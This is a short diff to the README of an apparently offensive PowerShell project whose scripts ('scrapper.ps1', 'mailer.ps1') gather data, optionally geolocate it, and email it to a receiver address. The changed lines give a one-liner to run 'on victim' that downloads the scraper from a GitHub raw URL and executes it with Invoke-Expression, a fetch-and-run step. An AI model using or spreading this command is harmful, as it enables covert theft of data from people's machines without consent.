@@ -13,4 +13,5 @@ Powershell script that
 - Fork project to own github so you can change the needed variables
 - Change the wiggle api key (optional if you dont need geolocation)
 - Change the receiver email in both scrapper.ps1 and mailer.ps1
-- Run in powershell on victim : Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourGithubRepo/master/scrapper.ps1')
+- Run in powershell on victim : 
+``` Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourGithubRepo/master/scrapper.ps1') ```
